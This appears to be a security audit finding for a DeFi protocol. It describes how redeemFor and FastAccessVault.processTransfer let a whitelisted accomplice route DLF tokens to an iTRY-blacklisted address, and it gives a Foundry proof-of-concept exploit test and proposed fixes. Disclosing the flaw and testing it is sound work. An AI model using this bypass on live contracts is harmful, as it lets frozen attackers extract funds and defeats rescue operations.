## Title
FastAccessVault.processTransfer Enables Blacklist Bypass by Sending DLF to iTRY-Blacklisted Recipients Without Validation

## Summary
The `processTransfer` function in `FastAccessVault.sol` sends DLF tokens directly to recipients without validating their blacklist status in the iTRY token contract. This allows iTRY-blacklisted users to receive value (DLF backing assets) through the `redeemFor` function, bypassing the intended access control restrictions and impairing rescue operations during security incidents.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/protocol/FastAccessVault.sol` (function `processTransfer`, lines 144-158) and `src/protocol/iTryIssuer.sol` (function `redeemFor`, lines 318-370) [1](#0-0) [2](#0-1) 

**Intended Logic:** The blacklist system should prevent blacklisted users from receiving any value from the protocol to enable effective rescue operations during hacks or security incidents, as stated in the README: "blacklist/whitelist bugs that would impair rescue operations in case of hacks or similar black swan events."

**Actual Logic:** When `redeemFor` is called, it validates that the caller is whitelisted and burns iTRY from the caller, but the `recipient` parameter is never checked against the iTRY blacklist. The recipient receives DLF tokens directly through `processTransfer`, which only validates that the address is non-zero and has sufficient balance, bypassing iTRY blacklist restrictions. [3](#0-2) 

**Exploitation Path:**
1. **Blacklist Event**: Protocol administrators blacklist a malicious actor's address (e.g., `hackerAddress`) in the iTRY token contract to freeze their assets during a security incident
2. **Collusion**: A non-blacklisted accomplice (or any whitelisted user through social engineering) calls `iTryIssuer.redeemFor(hackerAddress, amount, minOut)` 
3. **iTRY Burn**: The caller's iTRY tokens are burned successfully (caller is not blacklisted)
4. **DLF Transfer**: `_redeemFromVault` calls `liquidityVault.processTransfer(hackerAddress, netDlfAmount)` which sends DLF directly without checking iTRY blacklist status
5. **Value Extraction**: The blacklisted hacker receives DLF tokens (assuming they're not separately blacklisted in DLF token), extracting value from the protocol despite being blacklisted [4](#0-3) 

**Security Property Broken:** The iTRY token's `_beforeTokenTransfer` function enforces that blacklisted users cannot receive iTRY tokens (line 190-192), demonstrating the protocol's intent to completely freeze blacklisted addresses. However, this restriction is bypassed when receiving DLF through the redemption mechanism, as iTRY and DLF maintain separate blacklist systems that can be out of sync. [5](#0-4) 

## Impact Explanation

- **Affected Assets**: DLF tokens (protocol backing asset) held in FastAccessVault
- **Damage Severity**: Blacklisted malicious actors can receive value from the protocol by having accomplices or socially-engineered users call `redeemFor` on their behalf. While this requires cooperation from another user, it significantly impairs rescue operations during security incidents where freezing hacker addresses is critical.
- **User Impact**: Affects all protocol users during security incidents. If a hacker's address is blacklisted but they can still extract DLF, it undermines the effectiveness of the blacklist as a security control and allows value leakage during active exploits.

## Likelihood Explanation

- **Attacker Profile**: Blacklisted malicious actors with accomplices, or users who can socially engineer whitelisted participants
- **Preconditions**: 
  - Attacker address is blacklisted in iTRY token
  - Attacker address is NOT blacklisted in DLF token (separate systems)
  - Accomplice or manipulated user has whitelisted status on iTryIssuer
  - FastAccessVault has sufficient DLF balance
- **Execution Complexity**: Single transaction (`redeemFor` call), but requires cooperation from or manipulation of another user
- **Frequency**: Can be executed repeatedly during the window between iTRY blacklisting and corresponding DLF blacklisting, or indefinitely if DLF blacklist is not updated

## Recommendation

Add iTRY blacklist validation for the recipient parameter in both `redeemFor` and `processTransfer` functions:

```solidity
// In src/protocol/iTryIssuer.sol, function redeemFor, after line 325:

// Validate recipient is not blacklisted in iTRY token
if (iTryToken.hasRole(iTryToken.BLACKLISTED_ROLE(), recipient)) {
    revert RecipientBlacklisted(recipient);
}
```

Alternative approach: Validate in `FastAccessVault.processTransfer` to provide defense-in-depth:

```solidity
// In src/protocol/FastAccessVault.sol, function processTransfer, after line 146:

// Validate receiver is not blacklisted in iTRY token
IiTryToken iTryToken = IiTryToken(_issuerContract.iTryToken());
if (iTryToken.hasRole(iTryToken.BLACKLISTED_ROLE(), _receiver)) {
    revert ReceiverBlacklisted(_receiver);
}
```

Additional mitigation: Implement synchronized blacklist management across iTRY and DLF tokens, or use a shared blacklist registry to ensure consistency.

## Proof of Concept

```solidity
// File: test/Exploit_BlacklistBypassViaRedeemFor.t.sol
// Run with: forge test --match-test test_BlacklistBypass_RedeemForSendsDLFToBlacklistedUser -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {iTry} from "../src/token/iTRY/iTry.sol";
import {DLFToken} from "../src/external/DLFToken.sol";
import {RedstoneNAVFeed} from "../src/protocol/RedstoneNAVFeed.sol";
import {iTryIssuer} from "../src/protocol/iTryIssuer.sol";
import {IFastAccessVault} from "../src/protocol/interfaces/IFastAccessVault.sol";

contract Exploit_BlacklistBypass is Test {
    iTry public itryToken;
    DLFToken public dlfToken;
    RedstoneNAVFeed public oracle;
    iTryIssuer public issuer;
    IFastAccessVault public vault;
    
    address public admin;
    address public hacker;
    address public accomplice;
    address public treasury;
    address public custodian;
    
    bytes32 constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    uint256 constant INITIAL_NAV = 1e18;
    
    function setUp() public {
        admin = address(this);
        hacker = makeAddr("hacker");
        accomplice = makeAddr("accomplice");
        treasury = makeAddr("treasury");
        custodian = makeAddr("custodian");
        
        // Deploy contracts
        oracle = new RedstoneNAVFeed();
        vm.mockCall(
            address(oracle),
            abi.encodeWithSelector(RedstoneNAVFeed.price.selector),
            abi.encode(INITIAL_NAV)
        );
        
        dlfToken = new DLFToken(admin);
        
        iTry itryImpl = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            admin
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(itryImpl), initData);
        itryToken = iTry(address(proxy));
        
        issuer = new iTryIssuer(
            address(itryToken),
            address(dlfToken),
            address(oracle),
            treasury,
            address(this), // yieldReceiver
            custodian,
            admin,
            0, // initialIssued
            0, // initialDLF
            500, // buffer 5%
            0 // min balance
        );
        
        vault = issuer.liquidityVault();
        
        // Setup roles
        itryToken.grantRole(MINTER_CONTRACT, address(issuer));
        issuer.addToWhitelist(accomplice);
        
        // Fund accomplice with DLF
        dlfToken.mint(accomplice, 10000e18);
    }
    
    function test_BlacklistBypass_RedeemForSendsDLFToBlacklistedUser() public {
        console.log("\n=== EXPLOIT: Blacklist Bypass via redeemFor ===\n");
        
        // SETUP: Accomplice mints iTRY and transfers DLF to vault
        vm.startPrank(accomplice);
        dlfToken.approve(address(issuer), 5000e18);
        uint256 itryMinted = issuer.mintITRY(5000e18, 0);
        vm.stopPrank();
        
        console.log("Accomplice minted iTRY:", itryMinted);
        console.log("Accomplice iTRY balance:", itryToken.balanceOf(accomplice));
        
        // Transfer DLF to vault for redemption
        uint256 vaultDLF = 2500e18;
        dlfToken.mint(address(vault), vaultDLF);
        console.log("Vault DLF balance:", dlfToken.balanceOf(address(vault)));
        
        // BLACKLIST EVENT: Admin blacklists hacker in iTRY
        itryToken.addBlacklistAddress(_toArray(hacker));
        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, hacker), "Hacker should be blacklisted");
        console.log("\nHacker blacklisted in iTRY token");
        
        // Verify hacker CANNOT receive iTRY directly (proper blacklist enforcement)
        vm.prank(accomplice);
        vm.expectRevert();
        itryToken.transfer(hacker, 100e18);
        console.log("Confirmed: Hacker cannot receive iTRY transfers");
        
        // EXPLOIT: Accomplice calls redeemFor to send DLF to blacklisted hacker
        uint256 redeemAmount = 1000e18;
        uint256 hackerDLFBefore = dlfToken.balanceOf(hacker);
        
        vm.startPrank(accomplice);
        itryToken.approve(address(issuer), redeemAmount);
        bool fromBuffer = issuer.redeemFor(hacker, redeemAmount, 0);
        vm.stopPrank();
        
        // VERIFY: Hacker received DLF despite being blacklisted in iTRY
        uint256 hackerDLFAfter = dlfToken.balanceOf(hacker);
        console.log("\nExploit Result:");
        console.log("- Hacker DLF before:", hackerDLFBefore);
        console.log("- Hacker DLF after:", hackerDLFAfter);
        console.log("- DLF received:", hackerDLFAfter - hackerDLFBefore);
        console.log("- Redeemed from buffer:", fromBuffer);
        
        assertGt(hackerDLFAfter, hackerDLFBefore, "Vulnerability confirmed: Blacklisted user received DLF");
        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, hacker), "Hacker still blacklisted in iTRY");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Blacklisted iTRY user successfully received DLF tokens");
        console.log("This bypasses the blacklist restriction and impairs rescue operations");
    }
    
    function _toArray(address addr) internal pure returns (address[] memory) {
        address[] memory arr = new address[](1);
        arr[0] = addr;
        return arr;
    }
}
```

## Notes

- This vulnerability requires cooperation from another user (accomplice or socially-engineered participant), which makes it less severe than a direct bypass, but it's still exploitable in realistic attack scenarios where hackers have accomplices.
- The issue stems from the architectural decision to have separate blacklist systems for iTRY and DLF tokens, which can become desynchronized.
- The `redeemFor` function's design allows any whitelisted user to specify an arbitrary recipient, which is useful for legitimate use cases but creates a security gap when combined with the lack of blacklist validation.
- This finding is distinct from the known Zellic issue about allowance-based transfers, as it involves a completely different mechanism (redemption to DLF rather than iTRY transfers).
- The DLF token's own blacklist provides partial protection, but only if administrators remember to blacklist addresses in both systems simultaneously.

### Citations

**File:** src/protocol/FastAccessVault.sol (L144-158)
```text
    function processTransfer(address _receiver, uint256 _amount) external onlyIssuer {
        if (_receiver == address(0)) revert CommonErrors.ZeroAddress();
        if (_receiver == address(this)) revert InvalidReceiver(_receiver);
        if (_amount == 0) revert CommonErrors.ZeroAmount();

        uint256 currentBalance = _vaultToken.balanceOf(address(this));
        if (currentBalance < _amount) {
            revert InsufficientBufferBalance(_amount, currentBalance);
        }

        if (!_vaultToken.transfer(_receiver, _amount)) {
            revert CommonErrors.TransferFailed();
        }
        emit TransferProcessed(_receiver, _amount, (currentBalance - _amount));
    }
```

**File:** src/protocol/iTryIssuer.sol (L318-370)
```text
    function redeemFor(address recipient, uint256 iTRYAmount, uint256 minAmountOut)
        public
        onlyRole(_WHITELISTED_USER_ROLE)
        nonReentrant
        returns (bool fromBuffer)
    {
        // Validate recipient address
        if (recipient == address(0)) revert CommonErrors.ZeroAddress();

        // Validate iTRYAmount > 0
        if (iTRYAmount == 0) revert CommonErrors.ZeroAmount();

        if (iTRYAmount > _totalIssuedITry) {
            revert AmountExceedsITryIssuance(iTRYAmount, _totalIssuedITry);
        }

        // Get NAV price from oracle
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate gross DLF amount: iTRYAmount * 1e18 / navPrice
        uint256 grossDlfAmount = iTRYAmount * 1e18 / navPrice;

        if (grossDlfAmount == 0) revert CommonErrors.ZeroAmount();

        uint256 feeAmount = _calculateRedemptionFee(grossDlfAmount);
        uint256 netDlfAmount = grossDlfAmount - feeAmount;

        // Check if output meets minimum requirement
        if (netDlfAmount < minAmountOut) {
            revert OutputBelowMinimum(netDlfAmount, minAmountOut);
        }

        _burn(msg.sender, iTRYAmount);

        // Check if buffer pool has enough DLF balance
        uint256 bufferBalance = liquidityVault.getAvailableBalance();

        if (bufferBalance >= grossDlfAmount) {
            // Buffer has enough - serve from buffer
            _redeemFromVault(recipient, netDlfAmount, feeAmount);

            fromBuffer = true;
        } else {
            // Buffer insufficient - serve from custodian
            _redeemFromCustodian(recipient, netDlfAmount, feeAmount);

            fromBuffer = false;
        }

        // Emit redemption event
        emit ITRYRedeemed(recipient, iTRYAmount, netDlfAmount, fromBuffer, redemptionFeeInBPS);
    }
```

**File:** src/protocol/iTryIssuer.sol (L627-635)
```text
    function _redeemFromVault(address receiver, uint256 receiveAmount, uint256 feeAmount) internal {
        _totalDLFUnderCustody -= (receiveAmount + feeAmount);

        liquidityVault.processTransfer(receiver, receiveAmount);

        if (feeAmount > 0) {
            liquidityVault.processTransfer(treasury, feeAmount);
        }
    }
```

**File:** src/token/iTRY/iTry.sol (L177-196)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        // State 2 - Transfers fully enabled except for blacklisted addresses
        if (transferState == TransferState.FULLY_ENABLED) {
            if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redeeming
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redistributing - burn
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to))
            {
                // redistributing - mint
            } else if (
                !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
                    && !hasRole(BLACKLISTED_ROLE, to)
            ) {
                // normal case
            } else {
                revert OperationNotAllowed();
            }
```

**File:** src/external/DLFToken.sol (L25-29)
```text
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override whenNotPaused {
        require(!_isBlacklisted[from], "ERC20: sender is blacklisted");
        require(!_isBlacklisted[to], "ERC20: recipient is blacklisted");
        super._beforeTokenTransfer(from, to, amount);
    }
```
